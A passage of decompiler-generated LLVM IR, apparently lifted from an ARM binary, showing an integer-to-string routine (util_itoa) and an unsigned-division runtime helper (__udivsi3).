  %v9_11d7c = icmp eq i8 %v2_11d74, %v2_11d78
  br i1 %v9_11d7c, label %dec_label_pc_11d64, label %dec_label_pc_11d88

dec_label_pc_11d88:                               ; preds = %dec_label_pc_11d64, %dec_label_pc_11d6c.preheader, %dec_label_pc_11d74, %bb28
  %storemerge = phi i32 [ 0, %bb28 ], [ 1, %dec_label_pc_11d6c.preheader ], [ 1, %dec_label_pc_11d64 ], [ 0, %dec_label_pc_11d74 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_11d64, { 1, 0 }
  uselistorder i32 %v0_11d68, { 1, 0 }
  uselistorder i32 %v0_11d54, { 3, 0, 1, 2 }
  uselistorder i32 %v1_11d44, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11d10, { 0, 3, 1, 4, 6, 2, 5 }
  uselistorder i8 %v2_11d08, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d88, { 2, 0, 1, 3 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_11d9c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11d9c, i32* %r8.global-to-local, align 4
  %v2_11d9c = icmp eq i32 %v0_11d9c, 0
  store i1 %v2_11d9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_11d9c, label %dec_label_pc_11e7c, label %dec_label_pc_11dac

dec_label_pc_11dac:                               ; preds = %entry
  %v3_11dac = icmp eq i8 %arg1, 0
  store i1 %v3_11dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11dac, label %.thread, label %dec_label_pc_11dc0

.thread:                                          ; preds = %dec_label_pc_11dac
  %v4_11db4 = inttoptr i32 %v0_11d9c to i8*
  store i8 48, i8* %v4_11db4, align 1
  %v0_11db8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11db8.pr.pr, label %.thread1, label %dec_label_pc_11dc0

.thread1:                                         ; preds = %.thread
  %v4_11db8 = load i32, i32* %r8.global-to-local, align 4
  %v5_11db8 = add i32 %v4_11db8, 1
  %v6_11db8 = inttoptr i32 %v5_11db8 to i8*
  store i8 0, i8* %v6_11db8, align 1
  %v0_11dbc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11dbc.pr.pr, label %dec_label_pc_11e7c, label %dec_label_pc_11dc0

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11dac, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_11dc4 = icmp eq i32 %arg2, 10
  store i1 %v7_11dc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11dc4, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_11dc0
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_11dc0
  %v4_11dc0 = zext i1 %tmp48 to i32
  store i32 %v4_11dc0, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_11de48 = sub nsw i32 0, %tmp
  %tmp.v3_11de48 = select i1 %phitmp, i32 %tmp, i32 %v3_11de48
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_11de48, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_11df0 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_11df0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11df4

dec_label_pc_11df4:                               ; preds = %bb46, %.thread6
  %v2_11e14 = phi i32 [ %v1_11e20, %bb46 ], [ 32, %.thread6 ]
  %v0_11e08 = phi i32 [ %v2_11e18, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_11df8 = load i32, i32* %r6.global-to-local, align 4
  %v3_11dfc = urem i32 %v0_11e08, %v0_11df8
  store i32 %v3_11dfc, i32* %r1.global-to-local, align 4
  %v7_11e00 = icmp eq i32 %v3_11dfc, 9
  store i1 %v7_11e00, i1* %cpsr_z.global-to-local, align 1
  %v1_11e04 = add i32 %v3_11dfc, 48
  store i32 %v0_11e08, i32* %r0.global-to-local, align 4
  %v7_11e0c = icmp sgt i32 %v3_11dfc, 9
  %extract.t = trunc i32 %v1_11e04 to i8
  br i1 %v7_11e0c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_11df4
  %v9_11e0c = add i32 %v3_11dfc, 55
  %extract.t28 = trunc i32 %v9_11e0c to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_11df4, %bb45
  %v0_11e14.off0 = phi i8 [ %extract.t, %dec_label_pc_11df4 ], [ %extract.t28, %bb45 ]
  store i32 %v0_11df8, i32* %r1.global-to-local, align 4
  %v3_11e14 = load i32, i32* %r7.global-to-local, align 4
  %v4_11e14 = add i32 %v3_11e14, %v2_11e14
  %v5_11e14 = inttoptr i32 %v4_11e14 to i8*
  store i8 %v0_11e14.off0, i8* %v5_11e14, align 1
  %v0_11e18 = load i32, i32* %r0.global-to-local, align 4
  %v1_11e18 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e18 = udiv i32 %v0_11e18, %v1_11e18
  store i32 %v2_11e18, i32* %r0.global-to-local, align 4
  %v2_11e1c = icmp ugt i32 %v1_11e18, %v0_11e18
  store i1 %v2_11e1c, i1* %cpsr_z.global-to-local, align 1
  %v0_11e20 = load i32, i32* %r5.global-to-local, align 4
  %v1_11e20 = add i32 %v0_11e20, -1
  store i32 %v1_11e20, i32* %r5.global-to-local, align 4
  br i1 %v2_11e1c, label %dec_label_pc_11e28, label %dec_label_pc_11df4

dec_label_pc_11e28:                               ; preds = %bb46
  %v0_11e28 = load i32, i32* %sl.global-to-local, align 4
  %v2_11e28 = icmp eq i32 %v0_11e28, 0
  store i1 %v2_11e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e28, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_11e28
  %v3_11e2c = ptrtoint i32* %stack_var_-32 to i32
  %v3_11e30 = add i32 %v1_11e20, %v3_11e2c
  store i32 %v3_11e30, i32* %r2.global-to-local, align 4
  %v4_11e38 = add i32 %v3_11e30, -34
  %v5_11e38 = inttoptr i32 %v4_11e38 to i8*
  store i8 45, i8* %v5_11e38, align 1
  %v0_11e3c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_11e3c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_11e3c.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_11e28
  %v1_11e3c = phi i32 [ %v1_11e20, %dec_label_pc_11e28 ], [ %v1_11e3c.pre, %.thread11 ]
  %v2_11e3c = add i32 %v1_11e3c, 1
  store i32 %v2_11e3c, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_11e48 = phi i32 [ %v2_11e3c, %.thread12 ], [ %v1_11e3c.pre, %.thread11 ]
  %v0_11e40 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e40 = add i32 %v0_11e40, %v1_11e48
  %v3_11e40 = inttoptr i32 %v2_11e40 to i8*
  %v4_11e40 = load i8, i8* %v3_11e40, align 1
  %v6_11e40 = zext i8 %v4_11e40 to i32
  %v2_11e44 = icmp eq i8 %v4_11e40, 0
  store i1 %v2_11e44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_11e40, i32* %r2.global-to-local, align 4
  br i1 %v2_11e44, label %dec_label_pc_11e8c, label %dec_label_pc_11e54.preheader

dec_label_pc_11e54.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11e54

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11e54.preheader, %dec_label_pc_11e54
  %v0_11e54 = phi i32 [ 0, %dec_label_pc_11e54.preheader ], [ %v1_11e54, %dec_label_pc_11e54 ]
  %v1_11e54 = add i32 %v0_11e54, 1
  store i32 %v1_11e54, i32* %r1.global-to-local, align 4
  %v2_11e58 = add i32 %v1_11e54, %v2_11e40
  %v3_11e58 = inttoptr i32 %v2_11e58 to i8*
  %v4_11e58 = load i8, i8* %v3_11e58, align 1
  %v2_11e5c = icmp eq i8 %v4_11e58, 0
  store i1 %v2_11e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e5c, label %dec_label_pc_11e64, label %dec_label_pc_11e54

dec_label_pc_11e64:                               ; preds = %dec_label_pc_11e54, %dec_label_pc_11e8c
  %v0_11e6825 = phi i32 [ %v6_11e40, %dec_label_pc_11e8c ], [ %v1_11e54, %dec_label_pc_11e54 ]
  %v0_11e64 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11e64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11e68

dec_label_pc_11e68:                               ; preds = %dec_label_pc_11e68.dec_label_pc_11e68_crit_edge, %dec_label_pc_11e64
  %v2_11e74 = phi i32 [ %v5_11e74, %dec_label_pc_11e68.dec_label_pc_11e68_crit_edge ], [ %v0_11e64, %dec_label_pc_11e64 ]
  %v0_11e6c = phi i32 [ %v0_11e6c.pre, %dec_label_pc_11e68.dec_label_pc_11e68_crit_edge ], [ %v2_11e40, %dec_label_pc_11e64 ]
  %v0_11e68 = phi i32 [ %v0_11e68.pre, %dec_label_pc_11e68.dec_label_pc_11e68_crit_edge ], [ %v0_11e6825, %dec_label_pc_11e64 ]
  %v1_11e68 = add i32 %v0_11e68, -1
  store i32 %v1_11e68, i32* %r1.global-to-local, align 4
  %v1_11e6c = inttoptr i32 %v0_11e6c to i8*
  %v2_11e6c = load i8, i8* %v1_11e6c, align 1
  %v5_11e6c = add i32 %v0_11e6c, 1
  store i32 %v5_11e6c, i32* %r2.global-to-local, align 4
  %v3_11e70 = icmp eq i32 %v0_11e68, 0
  store i1 %v3_11e70, i1* %cpsr_z.global-to-local, align 1
  %v3_11e74 = inttoptr i32 %v2_11e74 to i8*
  store i8 %v2_11e6c, i8* %v3_11e74, align 1
  %v4_11e74 = load i32, i32* %r0.global-to-local, align 4
  %v5_11e74 = add i32 %v4_11e74, 1
  store i32 %v5_11e74, i32* %r0.global-to-local, align 4
  br i1 %v3_11e70, label %dec_label_pc_11e7c, label %dec_label_pc_11e68.dec_label_pc_11e68_crit_edge

dec_label_pc_11e68.dec_label_pc_11e68_crit_edge:  ; preds = %dec_label_pc_11e68
  %v0_11e68.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_11e6c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11e68

dec_label_pc_11e7c:                               ; preds = %dec_label_pc_11e68, %.thread1, %entry
  %v0_11e7c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11e7c, i32* %r0.global-to-local, align 4
  ret i32 %v0_11e7c

dec_label_pc_11e8c:                               ; preds = %.thread11._crit_edge
  store i32 %v6_11e40, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11e64

; uselistorder directives
  uselistorder i32 %v5_11e74, { 1, 0 }
  uselistorder i1 %v3_11e70, { 1, 0 }
  uselistorder i32 %v0_11e6c, { 1, 0 }
  uselistorder i32 %v1_11e54, { 0, 1, 3, 2 }
  uselistorder i32 %v6_11e40, { 1, 0 }
  uselistorder i32 %v2_11e40, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11e3c.pre, { 1, 0 }
  uselistorder i32 %v1_11e20, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11e18, { 1, 0 }
  uselistorder i32 %v3_11dfc, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_11d9c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 9, 0, 8, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder label %dec_label_pc_11e64, { 1, 0 }
  uselistorder label %dec_label_pc_11e54, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_11dc0, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11e94 = load i32, i32* @r1, align 4
  %v1_11e94 = add i32 %v0_11e94, -1
  store i32 %v1_11e94, i32* %r2.global-to-local, align 4
  %v2_11e94 = icmp eq i32 %v0_11e94, 0
  %v7_11e94 = icmp eq i32 %v0_11e94, 1
  %v0_11e98 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_11e94, i32 %v0_11e98)
  br i1 %v2_11e94, label %dec_label_pc_11f7c, label %dec_label_pc_11ea0

dec_label_pc_11ea0:                               ; preds = %entry
  %v0_11ea0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11ea0 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_11ea0, %v1_11ea0
  br i1 %tmp, label %dec_label_pc_11ea8, label %dec_label_pc_11f34

dec_label_pc_11ea8:                               ; preds = %dec_label_pc_11ea0
  %v1_11ea8 = load i32, i32* %r2.global-to-local, align 4
  %v2_11ea8 = and i32 %v1_11ea8, %v1_11ea0
  %v4_11ea8 = icmp eq i32 %v2_11ea8, 0
  br i1 %v4_11ea8, label %dec_label_pc_11f40, label %dec_label_pc_11eb0

dec_label_pc_11eb0:                               ; preds = %dec_label_pc_11ea8
  %v3_11eb0 = icmp ult i32 %v1_11ea0, 536870912
  br i1 %v3_11eb0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11eb0
  %v4_11eb4 = mul i32 %v1_11ea0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11eb0, %.thread
  %v0_11ed4.pr36.ph = phi i32 [ %v4_11eb4, %.thread ], [ %v1_11ea0, %dec_label_pc_11eb0 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11eb0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_11ed4.pr36 = phi i32 [ %v4_11ec8, %bb81 ], [ %v0_11ed4.pr36.ph, %.preheader.preheader ]
  %v1_11ecc = phi i32 [ %v4_11ecc, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_11ec0 = icmp ugt i32 %v0_11ed4.pr36, 268435455
  br i1 %v2_11ec0, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_11ed4thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_11ec4 = icmp ult i32 %v0_11ed4.pr36, %v0_11ea0
  br i1 %v4_11ec4, label %bb80, label %dec_label_pc_11ed4thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_11ec8 = and i32 %v0_11ed4.pr36, 268435456
  %v3_11ec8 = icmp eq i32 %v2_11ec8, 0
  %v4_11ec8 = mul i32 %v0_11ed4.pr36, 16
  br i1 %v3_11ec8, label %bb81, label %dec_label_pc_11ed4.loopexit

bb81:                                             ; preds = %bb80
  %v2_11ecc = and i32 %v1_11ecc, 268435456
  %v3_11ecc = icmp eq i32 %v2_11ecc, 0
  %v4_11ecc = mul i32 %v1_11ecc, 16
  br i1 %v3_11ecc, label %.preheader, label %dec_label_pc_11ed4thread-pre-split.loopexit.loopexit

dec_label_pc_11ed4thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_11ee048.ph = phi i32 [ %v1_11ecc, %bb ], [ %v4_11ecc, %bb81 ]
  %v0_11ed4.pr38.ph = phi i32 [ %v0_11ed4.pr36, %bb ], [ %v4_11ec8, %bb81 ]
  br label %dec_label_pc_11ed4thread-pre-split.loopexit

dec_label_pc_11ed4thread-pre-split.loopexit:      ; preds = %dec_label_pc_11ed4thread-pre-split.loopexit.loopexit, %.thread2
  %v1_11ee048 = phi i32 [ %v1_11ecc, %.thread2 ], [ %v1_11ee048.ph, %dec_label_pc_11ed4thread-pre-split.loopexit.loopexit ]
  %v0_11ed4.pr38 = phi i32 [ %v0_11ed4.pr36, %.thread2 ], [ %v0_11ed4.pr38.ph, %dec_label_pc_11ed4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11ed4thread-pre-split

dec_label_pc_11ed4thread-pre-split:               ; preds = %dec_label_pc_11ed4thread-pre-split.loopexit, %bb83
  %v1_11ee046 = phi i32 [ %v1_11ee048, %dec_label_pc_11ed4thread-pre-split.loopexit ], [ %v3_11ee0, %bb83 ]
  %v0_11ed4.pr = phi i32 [ %v0_11ed4.pr38, %dec_label_pc_11ed4thread-pre-split.loopexit ], [ %v3_11edc, %bb83 ]
  br label %dec_label_pc_11ed4

dec_label_pc_11ed4.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11ed4.loopexit, %dec_label_pc_11ed4thread-pre-split
  %v1_11ee0 = phi i32 [ %v1_11ee046, %dec_label_pc_11ed4thread-pre-split ], [ %v1_11ecc, %dec_label_pc_11ed4.loopexit ]
  %v1_11edc = phi i32 [ %v0_11ed4.pr, %dec_label_pc_11ed4thread-pre-split ], [ %v4_11ec8, %dec_label_pc_11ed4.loopexit ]
  %v2_11ed4 = icmp slt i32 %v1_11edc, 0
  br i1 %v2_11ed4, label %dec_label_pc_11ee8, label %bb82

bb82:                                             ; preds = %dec_label_pc_11ed4
  %v4_11ed8 = icmp ult i32 %v1_11edc, %v0_11ea0
  br i1 %v4_11ed8, label %bb83, label %dec_label_pc_11ee8

bb83:                                             ; preds = %bb82
  %v3_11edc = mul i32 %v1_11edc, 2
  %v2_11ee0 = icmp slt i32 %v1_11ee0, 0
  %v3_11ee0 = mul i32 %v1_11ee0, 2
  br i1 %v2_11ee0, label %dec_label_pc_11ee8, label %dec_label_pc_11ed4thread-pre-split

dec_label_pc_11ee8:                               ; preds = %bb82, %dec_label_pc_11ed4, %bb83
  %v2_11ef459 = phi i32 [ %v3_11ee0, %bb83 ], [ %v1_11ee0, %bb82 ], [ %v1_11ee0, %dec_label_pc_11ed4 ]
  %v1_11eec51 = phi i32 [ %v3_11edc, %bb83 ], [ %v1_11edc, %bb82 ], [ %v1_11edc, %dec_label_pc_11ed4 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11eec

dec_label_pc_11eec:                               ; preds = %.thread11, %dec_label_pc_11ee8
  %v1_11f20 = phi i32 [ %v4_11f20, %.thread11 ], [ %v2_11ef459, %dec_label_pc_11ee8 ]
  %v1_11ef4 = phi i32 [ %v0_11f2c, %.thread11 ], [ 0, %dec_label_pc_11ee8 ]
  %v1_11f24 = phi i32 [ %v4_11f24, %.thread11 ], [ %v1_11eec51, %dec_label_pc_11ee8 ]
  %v1_11ef0 = phi i32 [ %v0_11f1c, %.thread11 ], [ %v0_11ea0, %dec_label_pc_11ee8 ]
  %v3_11eec = icmp ult i32 %v1_11ef0, %v1_11f24
  br i1 %v3_11eec, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_11eec
  %v3_11ef0 = sub i32 %v1_11ef0, %v1_11f24
  store i32 %v3_11ef0, i32* %r0.global-to-local, align 4
  %v3_11ef4 = or i32 %v1_11ef4, %v1_11f20
  store i32 %v3_11ef4, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11eec, %bb84
  %v1_11efc = phi i32 [ %v1_11ef0, %dec_label_pc_11eec ], [ %v3_11ef0, %bb84 ]
  %v1_11f00 = phi i32 [ %v1_11ef4, %dec_label_pc_11eec ], [ %v3_11ef4, %bb84 ]
  %v4_11ef8 = udiv i32 %v1_11f24, 2
  %v6_11ef8 = icmp ult i32 %v1_11efc, %v4_11ef8
  br i1 %v6_11ef8, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_11efc = urem i32 %v1_11f24, 2
  %v4_11efc = icmp eq i32 %v3_11efc, 0
  %v6_11efc = sub i32 %v1_11efc, %v4_11ef8
  store i32 %v6_11efc, i32* %r0.global-to-local, align 4
  br i1 %v4_11efc, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_11f00 = udiv i32 %v1_11f20, 2
  %v6_11f00 = or i32 %v1_11f00, %v5_11f00
  store i32 %v6_11f00, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_11f08 = phi i32 [ %v6_11efc, %bb85 ], [ %v1_11efc, %.thread7 ], [ %v6_11efc, %bb86 ]
  %v1_11f0c = phi i32 [ %v1_11f00, %bb85 ], [ %v1_11f00, %.thread7 ], [ %v6_11f00, %bb86 ]
  %v4_11f04 = udiv i32 %v1_11f24, 4
  %v6_11f04 = icmp ult i32 %v1_11f08, %v4_11f04
  br i1 %v6_11f04, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_11f08 = and i32 %v1_11f24, 2
  %v4_11f08 = icmp eq i32 %v3_11f08, 0
  %v6_11f08 = sub i32 %v1_11f08, %v4_11f04
  store i32 %v6_11f08, i32* %r0.global-to-local, align 4
  br i1 %v4_11f08, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11f0c = udiv i32 %v1_11f20, 4
  %v6_11f0c = or i32 %v1_11f0c, %v5_11f0c
  store i32 %v6_11f0c, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_11f14 = phi i32 [ %v6_11f08, %bb87 ], [ %v1_11f08, %.thread8 ], [ %v6_11f08, %bb88 ]
  %v1_11f18 = phi i32 [ %v1_11f0c, %bb87 ], [ %v1_11f0c, %.thread8 ], [ %v6_11f0c, %bb88 ]
  %v4_11f10 = udiv i32 %v1_11f24, 8
  %v6_11f10 = icmp ult i32 %v1_11f14, %v4_11f10
  br i1 %v6_11f10, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_11f14 = and i32 %v1_11f24, 4
  %v4_11f14 = icmp eq i32 %v3_11f14, 0
  %v6_11f14 = sub i32 %v1_11f14, %v4_11f10
  store i32 %v6_11f14, i32* %r0.global-to-local, align 4
  br i1 %v4_11f14, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11f18 = udiv i32 %v1_11f20, 8
  %v6_11f18 = or i32 %v1_11f18, %v5_11f18
  store i32 %v6_11f18, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_11f2c = phi i32 [ %v1_11f18, %bb89 ], [ %v1_11f18, %.thread9 ], [ %v6_11f18, %bb90 ]
  %v0_11f1c = phi i32 [ %v6_11f14, %bb89 ], [ %v1_11f14, %.thread9 ], [ %v6_11f14, %bb90 ]
  %v2_11f1c = icmp eq i32 %v0_11f1c, 0
  br i1 %v2_11f1c, label %dec_label_pc_11f2c, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_11f20, 16
  br i1 %tmp138, label %dec_label_pc_11f2c, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_11f20 = udiv i32 %v1_11f20, 16
  %v4_11f24 = udiv i32 %v1_11f24, 16
  br label %dec_label_pc_11eec

dec_label_pc_11f2c:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_11f2c, i32* %r0.global-to-local, align 4
  ret i32 %v0_11f2c

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11ea0
  %v9_11ea0 = icmp eq i32 %v0_11ea0, %v1_11ea0
  %. = zext i1 %v9_11ea0 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_11f40:                               ; preds = %dec_label_pc_11ea8
  %v2_11f40 = icmp ugt i32 %v1_11ea0, 65535
  br i1 %v2_11f40, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_11f40
  %v2_11f44 = and i32 %v1_11ea0, 32768
  %v3_11f44 = icmp eq i32 %v2_11f44, 0
  %v4_11f44 = udiv i32 %v1_11ea0, 65536
  br i1 %v3_11f44, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_11f40
  %v0_11f5065 = phi i32 [ %v1_11ea0, %dec_label_pc_11f40 ], [ %v4_11f44, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_11f54 = phi i32 [ %v0_11f5065, %.thread16 ], [ %v4_11f44, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_11f50 = icmp ugt i32 %v1_11f54, 255
  br i1 %v2_11f50, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_11f54 = and i32 %v1_11f54, 128
  %v3_11f54 = icmp eq i32 %v2_11f54, 0
  %v4_11f54 = udiv i32 %v1_11f54, 256
  br i1 %v3_11f54, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_11f58 = or i32 %storemerge, 8
  store i32 %v2_11f58, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_11f64 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_11f58, %bb98 ]
  %v1_11f60 = phi i32 [ %v1_11f54, %bb96 ], [ %v4_11f54, %bb97 ], [ %v4_11f54, %bb98 ]
  %v2_11f5c = icmp ugt i32 %v1_11f60, 15
  br i1 %v2_11f5c, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_11f60 = and i32 %v1_11f60, 8
  %v3_11f60 = icmp eq i32 %v2_11f60, 0
  %v4_11f60 = udiv i32 %v1_11f60, 16
  br i1 %v3_11f60, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11f64 = add nsw i32 %v1_11f64, 4
  store i32 %v2_11f64, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_11f6c = phi i32 [ %v1_11f64, %.thread17 ], [ %v1_11f64, %bb99 ], [ %v2_11f64, %bb100 ]
  %v5_11f70 = phi i32 [ %v1_11f60, %.thread17 ], [ %v4_11f60, %bb99 ], [ %v4_11f60, %bb100 ]
  %v2_11f68 = icmp ugt i32 %v5_11f70, 3
  %v7_11f68 = icmp eq i32 %v5_11f70, 4
  %v2_11f6c = xor i1 %v7_11f68, true
  %v3_11f6c = and i1 %v2_11f68, %v2_11f6c
  br i1 %v3_11f6c, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_11f6c = add nsw i32 %v4_11f6c, 3
  store i32 %v5_11f6c, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_11f70 = phi i32 [ %v4_11f6c, %.thread18 ], [ %v5_11f6c, %bb101 ]
  %v2_11f70 = xor i1 %v2_11f68, true
  %v3_11f70 = or i1 %v7_11f68, %v2_11f70
  br i1 %v3_11f70, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_11f70 = udiv i32 %v5_11f70, 2
  %v9_11f70 = add i32 %v4_11f70, %v8_11f70
  store i32 %v9_11f70, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_11f74 = phi i32 [ %v4_11f70, %bb102 ], [ %v9_11f70, %bb103 ]
  %v6_11f74 = lshr i32 %v0_11ea0, %v1_11f74
  store i32 %v6_11f74, i32* %r0.global-to-local, align 4
  ret i32 %v6_11f74

dec_label_pc_11f7c:                               ; preds = %entry
  %v0_11f80 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11f70, { 1, 0 }
  uselistorder i1 %v7_11f68, { 1, 0 }
  uselistorder i32 %v4_11f60, { 1, 0 }
